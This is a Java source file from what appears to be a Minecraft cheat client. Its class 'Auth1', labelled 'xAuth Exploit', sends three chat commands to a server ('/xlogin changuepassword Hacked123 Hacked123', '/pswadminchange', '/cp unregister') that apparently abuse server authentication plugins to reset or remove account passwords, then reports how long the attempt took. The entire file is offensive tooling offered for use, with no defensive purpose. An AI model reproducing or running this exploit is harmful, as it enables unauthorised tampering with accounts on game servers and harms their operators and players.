package it.md_4.troy.command.bypass.auth;


import it.md_4.troy.command.bypass.BypassInfo;
import it.md_4.troy.command.bypass.BypassType;
import it.md_4.troy.exception.BypassException;
import it.md_4.troy.command.bypass.Bypass;
import it.md_4.troy.helper.ChatHelper;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;

@BypassInfo(
        name = "xauth",
        type = BypassType.AUTH,
        description = "xAuth Exploit"
)
public class Auth1 extends Bypass {

    @Override
    public void execute(Object... args) throws BypassException {
        long start = System.currentTimeMillis();
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/xlogin changuepassword Hacked123 Hacked123"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/pswadminchange"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/cp unregister"));
        ChatHelper.printMessage(String.format("&b • &bSent &8[&7Method: &3%s&7, Time: &3%sms&8]", getName(),
                System.currentTimeMillis() - start));
    }
}
